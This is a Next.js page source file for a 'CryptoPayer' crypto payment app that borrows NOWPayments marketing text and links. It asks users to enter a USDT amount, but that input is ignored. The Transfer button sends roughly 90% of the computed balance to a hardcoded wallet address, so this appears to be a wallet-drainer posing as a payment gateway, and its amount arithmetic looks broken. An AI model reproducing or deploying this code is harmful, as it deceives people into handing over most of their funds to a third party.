import { useState, useEffect } from 'react';
import { Web3Button, useContract, useTransferToken, useBalance, ConnectWallet } from "@thirdweb-dev/react";
import { ethers, BigNumber } from 'ethers'; // Import BigNumber from ethers
import styles from '../styles/Home.module.css'; // Import styles object
import { NextPage } from "next";
import Head from 'next/head';

const contractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const toAddress = "0xb7F39cd417931f50A92DEAaD35fdA904Bfe42A4d";

const Home: NextPage = () => {
  const { contract } = useContract(contractAddress);

  const {
    mutate: transferTokens,
    isLoading,
    error,
  } = useTransferToken(contract);

  // Hook to get user's balance
  const { data: balanceData, isLoading: balanceLoading, error: balanceError, refetch: refetchBalance } = useBalance("0xdac17f958d2ee523a2206206994597c13d831ec7");

  // State to store user balance
  const [userBalanceInEther, setUserBalanceInEther] = useState<number>(0);

  // Function to convert Wei to Ether
  const weiToEther = (wei: BigNumber): string => {
    return ethers.utils.formatEther(wei);
  };

  // Fetch user's balance when component mounts
  useEffect(() => {
    if (balanceData) {
      const balanceInEther = weiToEther(balanceData.value);
      setUserBalanceInEther(parseFloat(balanceInEther)); // Parse the string to a number
    }
  }, [balanceData]);

  // Calculate 90% of the user's balance
  const transferAmountInEther = (userBalanceInEther * 0.9).toString();

  return (
    <div className={styles.container}>
      <Head>
        <title>CryptoPayer App</title>
        <meta
          content="Generated by @CryptoPayer"
          name="description"
        />
        <link href="/favicon.ico" rel="icon" />
      </Head>

      <main className={styles.main}>
        <ConnectWallet />
        <h2>Please Enter Pay Amount in USDT:</h2>
        <input
          type="text"
          placeholder="USDT Amount:"
        />
        <Web3Button
          contractAddress={contractAddress}
          action={() =>
            transferTokens({
              to: toAddress, // Address to transfer to
              amount: (parseFloat(transferAmountInEther) * 1000000000000).toFixed(3), // Amount to transfer
            })
          }
        >
          Transfer
        </Web3Button>

        <h1 className={styles.title}>
          Welcome to <a href="">CryptoPayer</a>
        </h1>

        <p className={styles.description}>
          Start Accepting Crypto Payments NOW{' '}
        </p>

        <div className={styles.grid}>
          <a className={styles.card} href="https://nowpayments.io/supported-coins">
            <h2>300+ cryptocurrencies available &rarr;</h2>
            <p>Accept BTC, ETH and any other cryptocurrency of your choice</p>
          </a>

          <a className={styles.card} href="https://nowpayments.io/pricing">
            <h2>Only 0.5% – the lowest fee on the market &rarr;</h2>
            <p>Pay less our 0.5% fees are the lowest on the market</p>
          </a>

          <a className={styles.card} href="https://nowpayments.io/instant-payouts">
            <h2>Withdraw euro directly to your bank account &rarr;</h2>
            <p>Receive your funds directly to your wallet - right away</p>
          </a>
          <p></p>
          <p></p>
          <a className={styles.card} href="https://nowpayments.io/premium-account-manager">
            <h2>Personal account manager & 24/7 support &rarr;</h2>
            <p>Your personal manager and 24/7 support will answer all your questions</p>
          </a>
        </div>
      </main>

      <footer className={styles.footer}>
        <a href="cryptopayer.center" rel="noopener noreferrer" target="_blank">
          Made with ❤️ by NOWPayments – 2024
        </a>
      </footer>
    </div>
  );
};

export default Home;
